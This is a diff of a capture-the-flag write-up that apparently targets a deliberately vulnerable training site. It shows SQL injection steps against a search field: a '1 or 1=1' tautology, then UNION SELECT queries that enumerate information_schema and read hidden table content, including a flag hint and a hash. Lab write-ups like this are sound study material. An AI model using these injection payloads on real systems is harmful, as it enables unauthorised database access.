@@ -1,18 +1,17 @@
 Injection sql search members :
 
 If we try to submit :
-1 or 1 = 1
+"1 or 1 = 1"
 -> We can see :
-ID: 1 or 1=1 
+"ID: 1 or 1=1 
 Title: Hack me ?
-Url : borntosec.ddns.net/images.png
+Url : borntosec.ddns.net/images.png"
 
 
 So we try to access to tables columns name :
-1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
-Url : list_images
+"1 or 1=1 UNION select table_name, column_name FROM information_schema.columns"
 -> we can see a table named users, with severals columns :
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
+"ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
 Title: id
 Url : list_images
 ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
@@ -23,13 +22,14 @@ Title: title
 Url : list_images
 ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
 Title: comment
-Url : list_images
+Url : list_images"
 
 First try :
-1 or 1=1 UNION SELECT title, comment  FROM list_images
-ID: 1 or 1=1 UNION SELECT title, comment  FROM list_images 
+"1 or 1=1 UNION SELECT title, comment FROM list_images"
+-> we get :
+"ID: 1 or 1=1 UNION SELECT title, comment  FROM list_images 
 Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
-Url : Hack me ?
+Url : Hack me ?"
 
 
 
